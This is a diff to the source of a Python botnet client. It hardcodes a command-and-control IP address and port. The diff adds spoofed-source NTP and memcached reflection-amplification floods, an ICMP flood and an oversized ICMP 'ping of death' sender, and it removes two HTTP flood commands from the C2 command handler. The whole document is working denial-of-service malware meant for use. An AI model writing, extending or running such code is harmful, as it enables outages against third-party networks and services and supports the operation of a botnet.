@@ -8,9 +8,79 @@ import random
 import cloudscraper
 import requests
 import ctypes
+from icmplib import ping as pig
 
 C2_ADDRESS = "147.185.221.27"
 C2_PORT = 4887
+
+ntp_payload = "\x17\x00\x03\x2a" + "\x00" * 4
+def NTP(target, port, timer):
+    try:
+        with open("ntpServers.txt", "r") as f:
+            ntp_servers = f.readlines()
+        packets = random.randint(10, 150)
+    except Exception as e:
+        print(f"Erro: {e}")
+        pass
+
+    server = random.choice(ntp_servers).strip()
+    while time.time() < timer:
+        try:
+            packet = (
+                    IP(dst=server, src=target)
+                    / UDP(sport=random.randint(1, 65535), dport=int(port))
+                    / Raw(load=ntp_payload)
+            )
+            try:
+                for _ in range(50000000):
+                    send(packet, count=packets, verbose=False)
+            except Exception as e:
+                pass
+        except Exception as e:
+            pass
+
+mem_payload = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
+def MEM(target, port, timer):
+    packets = random.randint(1024, 60000)
+    try:
+        with open("memsv.txt", "r") as f:
+            memsv = f.readlines()
+    except:
+        pass
+    server = random.choice(memsv).strip()
+    while time.time() < timer:
+        try:
+            try:
+                packet = (
+                        IP(dst=server, src=target)
+                        / UDP(sport=port, dport=11211)
+                        / Raw(load=mem_payload)
+                )
+                for _ in range(5000000):
+                    send(packet, count=packets, verbose=False)
+            except:
+                pass
+        except:
+            pass
+
+def icmp(target, timer):
+    while time.time() < timer:
+        try:
+            for _ in range(5000000):
+                packet = random._urandom(int(random.randint(1024, 60000)))
+                pig(target, count=10, interval=0.2, payload_size=len(packet), payload=packet)
+        except:
+            pass
+
+def pod(target, timer):
+    while time.time() < timer:
+        try:
+            rand_addr = spoofer()
+            ip_hdr = IP(src=rand_addr, dst=target)
+            packet = ip_hdr / ICMP() / ("m" * 60000)
+            send(packet)
+        except:
+            pass
 
 def attack_udp(ip, port, secs, size=65500):
     while time.time() < secs:
@@ -141,20 +211,7 @@ def handle_c2_connection(c2):
                     threading.Thread(target=attack_junk, args=(ip, port, secs), daemon=True).start()
                     threading.Thread(target=attack_udp, args=(ip, port, secs), daemon=True).start()
                     threading.Thread(target=attack_tcp, args=(ip, port, secs), daemon=True).start()
-            elif command == "!HTTP_REQ":
-                url = args[1]
-                port = args[2]
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=REQ_attack, args=(url, secs, port), daemon=True).start()
-            elif command == "!HTTP_CFB":
-                url = args[1]
-                port = args[2]
-                secs = time.time() + int(args[3])
-                threads = int(args[4])
-                for _ in range(threads):
-                    threading.Thread(target=CFB, args=(url, secs, port), daemon=True).start()
+            
             elif command == 'PING':
                 c2.send('PONG'.encode())
     except:
